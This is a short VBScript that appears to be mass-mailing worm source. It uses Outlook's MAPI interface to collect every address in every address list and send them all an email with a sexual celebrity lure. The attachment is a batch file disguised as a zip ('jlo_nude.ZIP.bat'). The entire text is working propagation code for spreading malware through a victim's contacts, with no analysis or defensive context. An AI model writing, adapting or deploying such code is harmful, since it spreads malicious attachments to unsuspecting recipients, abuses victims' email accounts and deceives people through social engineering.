dim a,b,c,d,e  
set a = Wscript.CreateObject("Wscript.Shell")  
set b = CreateObject("Outlook.Application")  
set c = b.GetNameSpace("MAPI")  
for y = 1 To c.AddressLists.Count  
set d = c.AddressLists(y)  
x = 1  
set e = b.CreateItem(0)  
for o = 1 To d.AddressEntries.Count  
f = d.AddressEntries(x)  
e.Recipients.Add f  
x = x + 1  
next  
e.Subject = "Nude pics"  
e.Body = "I attached a zip file with nude pics of jlo.Hope you enjoy it"  
e.Attachments.Add ("c:\werm\jlo_nude.ZIP.bat")  
e.DeleteAfterSubmit = False  
e.Send  
f = ""  
next  
